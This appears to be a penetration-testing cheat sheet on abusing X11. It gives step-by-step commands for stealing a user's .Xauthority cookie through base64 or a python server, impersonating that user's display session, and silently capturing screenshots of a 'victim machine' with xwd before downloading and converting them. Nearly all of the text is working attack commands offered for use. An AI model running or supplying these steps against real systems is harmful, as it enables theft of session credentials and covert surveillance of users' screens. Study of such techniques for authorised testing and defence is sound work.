# X11

### Files present in home directory:

    .xsession, .Xauthority

### Check for the LightDM user in /etc/passwd for further confirmation.

### The presence of these files in a user's home directory might indicate that the user has already authenticated and possibly contain sensitive information to view.

## Steps:

#### 1) Transfer the .Xauthority file to our machine 

    cat .Xauthority | base64 
    
#### Then 

    echo 'BASE64_STRING' > /tmp/Xauthority 
    
#### or just transfer it via a python server.

#### 2) Set the cookie by pointing the environment variable to our cookie file

    export XAUTHORITY=/tmp/Xauthority 

#### 3) (Victim machine) Check which display the user we are trying to impersonate is using

    w 
    
#### 4) (Victim machine) Dumps an image of an x window, to get a screenshot in its current state.

    xwd 

### Example command: (-root: select root window, -screen: send GetImage request to root window, -silent: Do it silently, -display: specify the server to connect to)

#### 

    xwd -root -screen -silent -display :0 > /tmp/screen.xwd 

#### 5) Download the file from the victim host to our machine

#### 6) Convert to image format to view the screenshot

    convert /tmp/screen.xwd screen.png
